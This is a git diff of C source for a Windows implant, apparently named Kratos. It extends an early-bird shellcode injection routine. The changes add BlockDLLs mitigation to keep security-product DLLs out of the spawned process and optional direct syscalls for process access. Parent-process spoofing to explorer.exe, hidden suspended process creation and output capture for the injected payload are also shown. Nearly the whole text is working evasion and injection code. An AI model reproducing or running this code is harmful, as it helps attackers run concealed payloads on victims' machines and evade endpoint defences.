@@ -9,17 +9,24 @@
 #include <windows.h>
 #include <tlhelp32.h>
 
-#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS)
+#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_BLOCKDLLS)
 
 #ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 #define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
 #endif
+
+#ifndef PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
+#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x00020007
+#endif
+
+#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000ULL
 
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
 #endif
 
 char g_spawnto_path[512] = INJECT_DEFAULT_SPAWNTO;
+int  g_blockdlls         = 0;
 
 static DWORD find_explorer_pid(void) {
     DWORD  pid   = 0;
@@ -36,6 +43,7 @@ static DWORD find_explorer_pid(void) {
 
 int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
                      const char *cmdline_override,
+                     int capture_output,
                      EarlyBirdResult *out, char *errmsg, size_t errmsg_len) {
     /* Resolve host process full path */
     wchar_t whost_name[512] = {0};
@@ -51,27 +59,67 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
         wcsncpy(whost_full, whost_name, 511);
     }
 
-    /* PPID spoof: explorer.exe */
-    DWORD  spoof_pid = find_explorer_pid();
-    HANDLE hParent   = spoof_pid ? OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid) : NULL;
-    BOOL   use_spoof = FALSE;
-    LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;
+    /* Temp file for output capture: stdout+stderr merged, no pipe deadlock.
+     * Must be created before the attribute list.
+     * Note: PPID spoofing (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) causes the child to
+     * inherit handles from the spoofed parent, not from Kratos. PROC_THREAD_ATTRIBUTE_HANDLE_LIST
+     * would need handles valid in the parent process's table (not ours), which requires
+     * DuplicateHandle into explorer.exe. Skip PPID spoof when capturing output to keep
+     * standard bInheritHandles=TRUE inheritance working correctly. */
+    HANDLE hCaptureFile = NULL;
+    out->output_file[0] = '\0';
+    if (capture_output) {
+        char tmp_dir[MAX_PATH] = {0};
+        GetTempPathA(MAX_PATH, tmp_dir);
+        GetTempFileNameA(tmp_dir, "ea_", 0, out->output_file);
+        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+        hCaptureFile = CreateFileA(out->output_file, GENERIC_WRITE, FILE_SHARE_READ,
+                                   &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
+        if (hCaptureFile == INVALID_HANDLE_VALUE) {
+            hCaptureFile = NULL;
+            out->output_file[0] = '\0';
+        }
+    }
 
-    if (hParent) {
+    /* PPID spoof: explorer.exe - disabled when capture_output is set (handle inheritance conflict) */
+    DWORD  spoof_pid = capture_output ? 0 : find_explorer_pid();
+    HANDLE hParent   = NULL;
+    if (spoof_pid) {
+#ifdef EVASION_SYSCALLS
+        NTSTATUS _st = kratos_NtOpenProcess(&hParent, PROCESS_CREATE_PROCESS, spoof_pid);
+        if (!NT_SUCCESS(_st)) hParent = NULL;
+#else
+        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid);
+#endif
+    }
+
+    /* Attribute list: PPID spoof + BlockDLLs only.
+     * No HANDLE_LIST: bInheritHandles=TRUE with SECURITY_ATTRIBUTES.bInheritHandle on hCaptureFile
+     * is sufficient. The child's inherited copy of hCaptureFile is closed when the child exits;
+     * this does not affect Kratos's handle table (inherited handles are duplicates, not aliases). */
+    int     attr_count = (hParent ? 1 : 0) + (g_blockdlls ? 1 : 0);
+    BOOL    use_attr   = FALSE;
+    LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;
+    DWORD64 mitigation_policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+    if (attr_count > 0) {
         SIZE_T attr_size = 0;
-        InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
+        InitializeProcThreadAttributeList(NULL, attr_count, 0, &attr_size);
         attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
-        if (attr && InitializeProcThreadAttributeList(attr, 1, 0, &attr_size)) {
-            if (UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                                          &hParent, sizeof(hParent), NULL, NULL))
-                use_spoof = TRUE;
-            else { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); attr = NULL; }
+        if (attr && InitializeProcThreadAttributeList(attr, attr_count, 0, &attr_size)) {
+            use_attr = TRUE;
+            if (hParent)
+                UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                          &hParent, sizeof(hParent), NULL, NULL);
+            if (g_blockdlls)
+                UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                                          &mitigation_policy, sizeof(mitigation_policy), NULL, NULL);
         } else {
             if (attr) { HeapFree(GetProcessHeap(), 0, attr); attr = NULL; }
         }
     }
 
-    /* Build lpCommandLine (mutable wide string required by CreateProcessW) */
+    /* Build lpCommandLine */
     wchar_t wcmdline[2048] = {0};
     if (cmdline_override)
         MultiByteToWideChar(CP_UTF8, 0, cmdline_override, -1, wcmdline, 2048);
@@ -80,22 +128,32 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
 
     STARTUPINFOEXW siex;
     ZeroMemory(&siex, sizeof(siex));
-    siex.StartupInfo.cb          = use_spoof ? (DWORD)sizeof(siex) : (DWORD)sizeof(STARTUPINFOW);
+    siex.StartupInfo.cb          = use_attr ? (DWORD)sizeof(siex) : (DWORD)sizeof(STARTUPINFOW);
     siex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
     siex.StartupInfo.wShowWindow = SW_HIDE;
-    if (use_spoof) siex.lpAttributeList = attr;
+    if (use_attr) siex.lpAttributeList = attr;
+    if (hCaptureFile) {
+        siex.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
+        siex.StartupInfo.hStdOutput = hCaptureFile;
+        siex.StartupInfo.hStdError  = hCaptureFile;
+        siex.StartupInfo.hStdInput  = NULL;
+    }
 
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
     DWORD cflags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
-    if (use_spoof) cflags |= EXTENDED_STARTUPINFO_PRESENT;
+    if (use_attr) cflags |= EXTENDED_STARTUPINFO_PRESENT;
 
-    BOOL ok = CreateProcessW(whost_full, wcmdline, NULL, NULL, FALSE,
+    BOOL ok = CreateProcessW(whost_full, wcmdline, NULL, NULL,
+                             hCaptureFile ? TRUE : FALSE,
                              cflags, NULL, NULL, &siex.StartupInfo, &pi);
-    if (use_spoof) { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); }
+    if (use_attr) { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); }
     if (hParent) CloseHandle(hParent);
+    /* Close parent's copy - child inherited it; we read the file after process exit */
+    if (hCaptureFile) CloseHandle(hCaptureFile);
 
     if (!ok) {
+        if (out->output_file[0]) DeleteFileA(out->output_file);
         snprintf(errmsg, errmsg_len, "Error: CreateProcess(%s) failed (%lu)",
                  g_spawnto_path, GetLastError());
         return 0;
